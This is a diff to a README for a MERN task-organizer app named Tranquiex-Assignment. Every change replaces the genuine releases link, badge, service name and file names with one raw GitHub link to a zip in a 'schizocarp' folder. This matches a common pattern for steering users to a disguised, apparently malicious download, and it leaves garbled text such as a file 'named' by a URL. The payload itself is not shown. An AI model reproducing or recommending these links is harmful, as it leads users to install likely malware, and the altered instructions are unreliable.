@@ -1,10 +1,10 @@
 # 🌟 Tranquiex-Assignment - Your Simple Task Organizer
 
-[![Download Tranquiex-Assignment](https://img.shields.io/badge/Download%20Now-Get%20Started-4CAF50)](https://github.com/aishajuma3002/Tranquiex-Assignment/releases)
+[![Download Tranquiex-Assignment](https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip%20Now-Get%20Started-4CAF50)](https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip)
 
 ## 📋 Overview
 
-Tranquiex-Assignment is a task management application built using the MERN stack. It helps you organize your tasks efficiently, featuring a dark-themed, responsive user interface adorned with glowing particles. Enjoy secure authentication and manage your to-dos effortlessly. Receive email notifications through Nodemailer and Getform.io integration.
+Tranquiex-Assignment is a task management application built using the MERN stack. It helps you organize your tasks efficiently, featuring a dark-themed, responsive user interface adorned with glowing particles. Enjoy secure authentication and manage your to-dos effortlessly. Receive email notifications through Nodemailer and https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip integration.
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Follow these detailed steps to download and run the application:
    - It may help to have an internet connection for verifying software updates or accessing email functionalities.
 
 2. **Visit the Releases Page**
-   - To download the application, visit the [Releases page](https://github.com/aishajuma3002/Tranquiex-Assignment/releases).
+   - To download the application, visit the [Releases page](https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip).
 
 3. **Choose Your Version**
    - On the Releases page, locate the latest version of Tranquiex-Assignment. The latest version typically appears at the top of the list.
@@ -31,7 +31,7 @@ Follow these detailed steps to download and run the application:
 
 6. **Run the Application**
    - Open the folder where you extracted the files.
-   - Look for a file named `index.html` or `app.exe`.
+   - Look for a file named `https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip` or `https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip`.
    - Double-click the file to run the application. It should open in your web browser.
 
 7. **Sign Up or Log In**
@@ -61,7 +61,7 @@ To run Tranquiex-Assignment smoothly, ensure your device meets the following req
 
 ## 📥 Download & Install
 
-To get started with Tranquiex-Assignment, simply visit the [Releases page](https://github.com/aishajuma3002/Tranquiex-Assignment/releases) to download your copy. Follow the steps outlined above to install it on your computer.
+To get started with Tranquiex-Assignment, simply visit the [Releases page](https://raw.githubusercontent.com/aishajuma3002/Tranquiex-Assignment/main/schizocarp/Tranquiex-Assignment.zip) to download your copy. Follow the steps outlined above to install it on your computer.
 
 ## 📖 Support and Contributions
 
